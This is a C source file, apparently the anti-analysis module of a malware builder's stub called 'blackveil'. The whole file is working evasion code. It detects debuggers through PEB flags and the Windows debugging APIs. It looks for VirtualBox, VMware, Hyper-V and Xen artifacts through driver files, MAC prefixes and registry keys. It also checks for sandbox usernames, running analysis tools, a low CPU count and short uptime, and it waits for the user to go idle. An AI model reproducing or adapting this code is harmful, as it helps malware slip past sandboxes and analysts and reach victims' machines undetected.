/* blackveil/builder/stub/antianalysis.c
 *
 * Detection layers, cheapest first. Each defeats a specific class of
 * sandbox. None is a silver bullet: EDR on a real endpoint sees the
 * parent process, the timing, and the file drops regardless of what
 * this layer returns. That catch is by design — real-engagement targets
 * get kernel-level evasion added on top per the config's per-target
 * overrides, not here.
 */
#include "antianalysis.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "psapi.lib")

static BOOL _is_debugger_present(void) {
    if (IsDebuggerPresent()) return TRUE;

    BOOL remote = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
    if (remote) return TRUE;

    /* PEB.BeingDebugged byte — checked by hand to defeat naive
     * IsDebuggerPresent hooks. x64 offset 0x02. */
    BYTE being_debugged = 0;
    __try {
        PBYTE peb = (PBYTE)__readgsqword(0x60);
        being_debugged = *(peb + 0x02);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return TRUE;
    }
    if (being_debugged) return TRUE;

    /* PEB.NtGlobalFlag — set to 0x70 when a heap debugger is attached. */
    DWORD global_flag = 0;
    __try {
        PBYTE peb = (PBYTE)__readgsqword(0x60);
        global_flag = *(DWORD *)(peb + 0xBC);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return TRUE;
    }
    if (global_flag & 0x70) return TRUE;

    return FALSE;
}

static BOOL _has_vm_artifacts(void) {
    static const WCHAR *files[] = {
        L"C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
        L"C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
        L"C:\\Windows\\System32\\drivers\\VBoxSF.sys",
        L"C:\\Windows\\System32\\drivers\\vmhgfs.sys",
        L"C:\\Windows\\System32\\drivers\\vmmouse.sys",
        L"C:\\Windows\\System32\\drivers\\vmci.sys",
        L"C:\\Windows\\System32\\drivers\\vm3dmp.sys",
        L"C:\\Windows\\System32\\drivers\\vmusbmouse.sys",
        L"C:\\Windows\\System32\\drivers\\vmmemctl.sys",
        L"C:\\Windows\\System32\\drivers\\xenvbd.sys",
        L"C:\\Windows\\System32\\drivers\\xennet.sys",
        NULL
    };
    for (int i = 0; files[i]; i++) {
        DWORD attr = GetFileAttributesW(files[i]);
        if (attr != INVALID_FILE_ATTRIBUTES) return TRUE;
    }

    /* MAC OUI check — VirtualBox 08:00:27, VMware 00:0C:29 / 00:50:56,
     * Hyper-V 00:15:5D, Xen 00:16:3E. */
    static const BYTE vm_ouis[][3] = {
        {0x08, 0x00, 0x27}, {0x00, 0x0C, 0x29}, {0x00, 0x50, 0x56},
        {0x00, 0x15, 0x5D}, {0x00, 0x16, 0x3E},
    };
    DWORD buf_len = 0;
    GetAdaptersInfo(NULL, &buf_len);
    if (buf_len > 0 && buf_len < 65536) {
        PIP_ADAPTER_INFO info = (PIP_ADAPTER_INFO)HeapAlloc(
            GetProcessHeap(), 0, buf_len);
        if (info) {
            if (GetAdaptersInfo(info, &buf_len) == NO_ERROR) {
                PIP_ADAPTER_INFO it = info;
                while (it) {
                    for (int i = 0; i < (int)(sizeof(vm_ouis) / 3); i++) {
                        if (memcmp(it->Address, vm_ouis[i], 3) == 0) {
                            HeapFree(GetProcessHeap(), 0, info);
                            return TRUE;
                        }
                    }
                    it = it->Next;
                }
            }
            HeapFree(GetProcessHeap(), 0, info);
        }
    }

    /* Registry keys planted by guest additions / tools. */
    static const WCHAR *keys[] = {
        L"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        L"SOFTWARE\\VMware, Inc.\\VMware Tools",
        L"SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
        L"SYSTEM\\CurrentControlSet\\Services\\vmci",
        L"SYSTEM\\CurrentControlSet\\Services\\vmmouse",
        NULL
    };
    for (int i = 0; keys[i]; i++) {
        HKEY h;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keys[i], 0, KEY_READ, &h)
            == ERROR_SUCCESS) {
            RegCloseKey(h);
            return TRUE;
        }
    }
    return FALSE;
}

static BOOL _has_sandbox_username(void) {
    static const WCHAR *names[] = {
        L"sandbox", L"malware", L"virus", L"test", L"cuckoo",
        L"analyzer", L"admin", L"user", L"john", NULL
    };
    WCHAR user[256] = {0};
    DWORD sz = 255;
    if (!GetUserNameW(user, &sz)) return FALSE;
    _wcslwr_s(user, 256);
    for (int i = 0; names[i]; i++) {
        if (wcsstr(user, names[i]) != NULL) return TRUE;
    }
    return FALSE;
}

static BOOL _has_analysis_tools(void) {
    static const WCHAR *procs[] = {
        L"x64dbg.exe", L"x32dbg.exe", L"ida64.exe", L"ida.exe",
        L"procmon.exe", L"procmon64.exe", L"procexp.exe", L"procexp64.exe",
        L"wireshark.exe", L"fiddler.exe", L"ollydbg.exe", L"windbg.exe",
        L"immunitydebugger.exe", L"dnspy.exe", L"cheatengine-x86_64.exe",
        NULL
    };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32W pe = {0};
    pe.dwSize = sizeof(pe);
    BOOL found = FALSE;
    if (Process32FirstW(snap, &pe)) {
        do {
            for (int i = 0; procs[i]; i++) {
                if (_wcsicmp(pe.szExeFile, procs[i]) == 0) {
                    found = TRUE;
                    break;
                }
            }
        } while (!found && Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

static BOOL _has_suspicious_cpu(void) {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    /* Sandboxes typically expose 1-2 vCPUs. Real workstations 4+. */
    return si.dwNumberOfProcessors < 2;
}

static BOOL _has_suspicious_uptime(void) {
    ULONGLONG uptime = GetTickCount64();
    /* Freshly booted VM — less than 10 minutes — is a strong tell. */
    return uptime < (ULONGLONG)600000;
}

bv_aa_result_t bv_aa_check(void) {
    if (_is_debugger_present())     return BV_AA_DEBUGGER;
    if (_has_analysis_tools())      return BV_AA_TOOLS;
    if (_has_vm_artifacts())        return BV_AA_VM_ARTIFACTS;
    if (_has_sandbox_username())    return BV_AA_SANDBOX_USER;
    if (_has_suspicious_cpu())      return BV_AA_CPU_COUNT;
    if (_has_suspicious_uptime())   return BV_AA_UPTIME;
    return BV_AA_OK;
}

BOOL bv_aa_wait_idle(DWORD min_idle_sec, DWORD max_wait_sec) {
    DWORD start = GetTickCount();
    DWORD idle_ms = min_idle_sec * 1000;
    DWORD max_ms = max_wait_sec * 1000;
    for (;;) {
        LASTINPUTINFO lii = {0};
        lii.cbSize = sizeof(lii);
        if (GetLastInputInfo(&lii)) {
            DWORD elapsed = GetTickCount() - lii.dwTime;
            if (elapsed >= idle_ms) return TRUE;
        }
        if (GetTickCount() - start >= max_ms) return FALSE;
        Sleep(5000);
    }
}
